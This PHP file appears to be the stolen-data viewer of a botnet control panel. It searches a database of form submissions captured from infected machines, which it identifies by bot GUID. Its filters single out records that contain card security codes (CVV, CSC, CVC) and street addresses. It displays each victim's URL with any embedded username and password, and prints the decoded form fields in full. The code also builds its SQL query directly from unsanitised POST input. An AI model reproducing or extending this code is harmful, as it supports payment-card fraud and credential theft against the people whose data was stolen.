<?

$bot_guid = $_POST['bot_guid'];
$ccdatestart = $_POST['ccdatestart'];
$ccdateend = $_POST['ccdateend'];
$datasrch = $_POST['data'];
$showCVV = $_POST['showCVV'];
$showAddress = $_POST['showAddress'];
$limit = $_POST['limit'];


if (strlen($ccdatestart) && strlen($ccdateend)) {
	list($day, $month, $year) = split('[ :\/.-]', $ccdatestart);
	$tstamp0 = "$year-$month-$day 00:00:00";
	list($day, $month, $year) = split('[ :\/.-]', $ccdateend);
	$tstamp1 = gmmktime (0, 0, 0, $month, $day + 1, $year);
	$tstamp1 = gmdate('Y-m-d H:i:s', $tstamp1);
	$sqlp1 = " AND (UNIX_TIMESTAMP( ccs.date_rep ) >= UNIX_TIMESTAMP('$tstamp0') AND UNIX_TIMESTAMP( ccs.date_rep ) < UNIX_TIMESTAMP('$tstamp1'))";
}
if (strlen($bot_guid))
	$sqlp2 = " AND ccs.bot_guid LIKE '%$bot_guid%'";
if (strlen($datasrch)) {
	if ( strpos($datasrch, '*') !== false ) {
		$datasrch = str_replace( '*', '%', $datasrch );
	}
	if ($datasrch{0} != '%')
		$datasrch = '%' . $datasrch;
	if ($datasrch{ strlen($data) - 1 } != '%')
		$datasrch .= '%';
	
	$sqlp3 = " AND ccs.data LIKE '$datasrch'";
}
if (strlen($showCVV)) {
	$sqlp4 = " AND ((ccs.data LIKE '%cvv%') OR (ccs.data LIKE '%csc%') OR (ccs.data LIKE '%cvn%') OR (ccs.data LIKE '%cv=%') OR (ccs.data LIKE '%cvc%') OR (ccs.data LIKE '%cv2%') OR (ccs.data LIKE '%Sec%Code%'))";
}
if (strlen($showAddress)) {
	$sqlp5 = " AND ((ccs.data LIKE '%addr%') OR (ccs.data LIKE '%street%'))";
}
if (strlen($limit)) {
	$sqlp6 = " LIMIT $limit";
}

$sql = 'SELECT id, bot_guid, url, data, date_rep'
	 . "  FROM ccs"
	 . ' WHERE TRUE'
	 . $sqlp1
	 . $sqlp2
	 . $sqlp3
	 . $sqlp4
	 . $sqlp5
	 . $sqlp6;
echo "<!--$sql-->";
?>


<?
require_once 'mod_file.php';
require_once 'mod_time.php';
require_once 'mod_dbase.php';
require_once 'mod_strenc.php';

$dbase = db_open();

$res = mysqli_query($dbase, $sql);
if (!(@($res))) {
	writelog("error.log", "Wrong query : \" $sql \"");
	db_close($dbase);
	exit;
}

if ( mysqli_num_rows($res) == 0) {
	echo "<font class='error'><b>Not found</b></font>";
	db_close($dbase);
	exit;
}

echo "<table width='730' border='1' cellspacing='0' cellpadding='3' style='border: 1px solid #BBBBBB; font-size: 9px; border-collapse: collapse; background-color: #4992a7;'>";

echo "<th style=' color: #EEEEEE;'>id</th>";
echo "<th style=' color: #EEEEEE;'>bot_guid</th>";
echo "<th style=' color: #EEEEEE;'>url</th>";
echo "<th style=' color: #EEEEEE;'>date_rep</th>";

for ( $i=0; list($id, $bot_guid, $url, $data, $date_rep) = mysqli_fetch_row($res); $i++ ) {
	// ~~~
	//$botpc_user = substr($bot_guid, 0, strpos($bot_guid, '!'));
	//if ( $showUseless != true && strcmp($botpc_user, $name) == 0 )
	//	continue;
	// ~~~

	echo "<tr><td colspan='4'></td></tr>";

	$bgcolor = '#cce7ef';
	
	echo "<tr align='center' valign='middle' style=' background-color: {$bgcolor};' title='{$title}'>";
	
	$arr = parse_url( $url );
	if( $arr['user'] && $arr['pass'] ) $colon   = ':';
	if( $arr['user'] || $arr['pass'] ) $at_sign = '@';
	if( $arr['query'] ) $qmark = '?';
	
	$ucodebot = urlencode($bot_guid);
	// onclick=\"GB_show('Detail info for selected bot', '../../frm_bot.php?guid=$ucodebot', 300, 600); return false;\"
	echo "<td><a href='frm_bot.php?guid={$ucodebot}' target='_blank'><img border='0' src='img/info.png' title='{$id}'></a></td>";
	echo "<td>$bot_guid</td>";
	echo "<td title='$url'>{$arr['scheme']}://<i>{$arr['user']}$colon{$arr['pass']}</i>$at_sign<b>{$arr['host']}</b></td>";
	echo "<td>$date_rep</td>";
	
	echo '</tr>';
	
	echo "<tr style=' background-color: #cce7ef; '>";
	
	echo "<td colspan='4' style='background-color: #e7f2f6'>";
	
	/* ~~ */ echo '<table><tr>';
	//echo "<td valign='center'>";
	//$arr = explode("&", $data);
	//foreach ($arr as $value) {
	//	echo urldecode($value) . "<br>";
	//}	
	//echo "</td>";
	echo  "<textarea id='ta$i' style=' border-width: 1px; width: 730px; height: 500; background-color: \"white\"; color: #666666; ' readonly >";
	$arr = explode("&", $data);
	foreach ($arr as $value) {
		echo urldecode($value) . "\n";
	}	
	echo "</textarea>";
	
	echo "<script language='JavaScript'>var ta = document.getElementById('ta$i'); ta.style.height = ta.scrollHeight + 10 + \"px\";</script>";
	
	/* ~~ */ echo '</tr></table>';
	
	echo "</td>";
	
	echo '</tr>';
}
db_close($dbase);

echo "</table>";

?>
